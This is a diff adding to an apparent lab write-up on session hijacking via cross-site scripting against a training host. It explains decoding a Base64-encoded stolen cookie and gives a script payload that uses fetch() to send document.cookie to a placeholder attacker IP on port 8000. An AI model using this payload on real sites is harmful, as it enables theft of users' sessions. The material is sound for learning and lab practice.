@@ -106,5 +106,18 @@ Open a `New Private Window` and navigate to `http://xss.htb.net/profile?email=el
 
 By the time you hold your mouse over "test," you should now see the below in your attacking machine.
 
-\
-\
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Please note that the cookie is a Base64 value because we used the `btoa()` function, which will base64 encode the cookie's value. We can decode it using `atob("b64_string")` in the Dev Console of Web Developer Tools, as follows.
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+You can now use this stolen cookie to hijack the victim's session!
+
+We don't necessarily have to use the `window.location()` object that causes victims to get redirected. We can use `fetch()`, which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way.&#x20;
+
+Find an example of such a payload below.
+
+```javascript
+<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
+```
